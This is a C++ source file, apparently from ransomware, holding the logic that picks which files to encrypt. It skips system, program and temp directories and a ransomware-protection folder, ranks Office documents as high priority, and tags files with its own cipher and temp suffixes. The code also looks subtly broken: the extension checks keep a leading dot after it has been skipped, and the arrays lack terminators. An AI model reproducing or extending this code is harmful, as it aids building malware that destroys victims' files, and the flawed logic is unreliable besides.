#include "FileInfo.h"
#include <tchar.h>

FileList::FileList()
{
	m_pHead = new FileNode();
	m_pHead->m_pPrev = m_pHead->m_pNext = m_pHead;
	m_nFiles = 0;
}

FileList::~FileList()
{
	delete m_pHead;
	m_pHead = NULL;
	m_nFiles = 0;
}

BOOL FileList::Insert(PFileNode pNode)
{
	pNode->m_pNext = m_pHead;
	pNode->m_pPrev = m_pHead->m_pPrev;
	pNode->m_pPrev->m_pNext = pNode;
	m_pHead->m_pPrev = pNode;
	m_nFiles++;
	
	return TRUE;
}

BOOL isIgnorePath(LPCTSTR pFullPath, LPCTSTR pFileName)
{
	LPCTSTR pPath1 = _tcsnicmp(
		pFullPath,
		_T("\\\\"), 2) == 0 ?
		_tcsstr(pFullPath, _T("$\\")) :
		pFullPath + 1;

	LPCTSTR pPath2 = pPath1 + 1;
	if (pPath1)
	{
		if (!_tcsicmp(pPath2, _T("\\Intel")) ||
			!_tcsicmp(pPath2, _T("\\ProgramData")) ||
			!_tcsicmp(pPath2, _T("\\Windows")) ||
			!_tcsicmp(pPath2, _T("\\Program Files")) ||
			!_tcsicmp(pPath2, _T("\\Program Files (x86)")) ||
			!_tcsicmp(pPath2, _T("\\AppData\\Local\\Temp")) ||
			!_tcsicmp(pPath2, _T("\\Local Settings\\Temp"))
			)
		{
			DEBUG("Skip %s", pFullPath);
			return TRUE;
		}
	}

	if (!_tcsicmp(pFileName, _T("This folder protects against ransomware. Modifying it will reduce protection")) ||
		!_tcsicmp(pFileName, _T("Temporary Internet Files")) ||
		!_tcsicmp(pFileName, _T("Content.IE5"))
		)
	{
		DEBUG("Skip %s\n", pFullPath);
		return TRUE;
	}

	if (!_tcsicmp(pFileName, BASE_DIRNAME))
	{
		DEBUG("Skip %s\n", pFullPath);
		return TRUE;
	}

	return FALSE;
}

DWORD ClassifyFileType(LPCTSTR pFileName)
{
	static LPCTSTR HighPriorityFiles[] = {
		_T(".doc"), _T(".docx"), _T(".xls"),
	};
	static LPCTSTR LowPriorityFiles[] = {
		_T(".docm"), _T(".dot"),
	};

	if (LPCTSTR lpSuffix = _tcsrchr(pFileName, _T('.')))
	{
		lpSuffix++;
		if (!_tcsicmp(lpSuffix, _T(".exe")) ||
			!_tcsicmp(lpSuffix, _T(".dll"))
			)
		{
			return FILETYPE_EXE_DLL;
		}
		if (!_tcsicmp(lpSuffix, WZIP_SUFFIX_TEMP))
		{
			return FILETYPE_ZIP_TEMP;
		}
		if (!_tcsicmp(lpSuffix, WZIP_SUFFIX_WRITESRC))
		{
			return FILETYPE_WRITESRC;
		}
		if (!_tcsicmp(lpSuffix, WZIP_SUFFIX_CIPHER))
		{
			return FILETYPE_ENCRYPTED;
		}

		for (int i = 0; HighPriorityFiles[i]; i++)
		{
			if (!_tcsicmp(lpSuffix, HighPriorityFiles[i]))
			{
				return FILETYPE_HIGH_PRIORITY;
			}
		}

		for (int i = 0; LowPriorityFiles[i]; i++)
		{
			if (!_tcsicmp(lpSuffix, LowPriorityFiles[i]))
			{
				return FILETYPE_LOW_PRIORITY;
			}
		}
	}

	return FILETYPE_UNKNOWN;
}